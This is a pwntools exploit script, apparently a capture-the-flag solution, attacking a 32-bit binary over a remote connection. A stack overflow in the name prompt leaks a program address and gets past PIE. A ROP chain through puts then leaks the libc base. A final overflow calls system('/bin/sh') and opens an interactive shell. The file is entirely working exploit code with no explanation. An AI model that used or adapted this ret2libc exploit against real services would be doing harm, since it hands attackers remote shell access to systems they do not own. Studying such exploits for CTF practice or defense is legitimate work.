from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
#p = process(name)
p = remote("172.16.12.2",6666)
elf = ELF(name)
libc = ELF("./libc_86-2.23.so")
if args.G:
    gdb.attach(p)

p.recvuntil("Tell me your name:\n")
payload = b"a"*32 + b"b"*4
p.send(payload)
p.recvuntil("b"*4)
pro_addr = u32(p.recv(4)) - 0x81b
puts_got_addr = pro_addr + elf.got['puts']
puts_plt_addr = pro_addr + elf.plt['puts']
main_addr = pro_addr + elf.symbols['main']
success("pro_addr: " + hex(pro_addr))
success("puts_got_addr: " + hex(puts_got_addr))
success("puts_plt_addr: " + hex(puts_plt_addr))
success("main_addr: " + hex(main_addr))


p.recvuntil("What do you want to say?\n")
payload1 = b"a"*116 + p32(pro_addr + 0x2000) + b"a"*4
payload1 += p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)
p.sendline(payload1)

libc_addr = u32(p.recv(4)) - libc.symbols["puts"]
system_addr = libc_addr + libc.symbols["system"]
bin_sh_addr = libc_addr + next(libc.search(b'/bin/sh'))
success("libc_addr: " + hex(libc_addr))
success("system_addr: " + hex(system_addr))
success("bin_sh_addr: " + hex(bin_sh_addr))

p.recvuntil("Tell me your name:\n")
p.sendline("aaa")

p.recvuntil("What do you want to say?\n")
payload2 = b"c"*124  
payload2 += p32(system_addr) + b"1111" + p32(bin_sh_addr)
p.sendline(payload2)

p.interactive()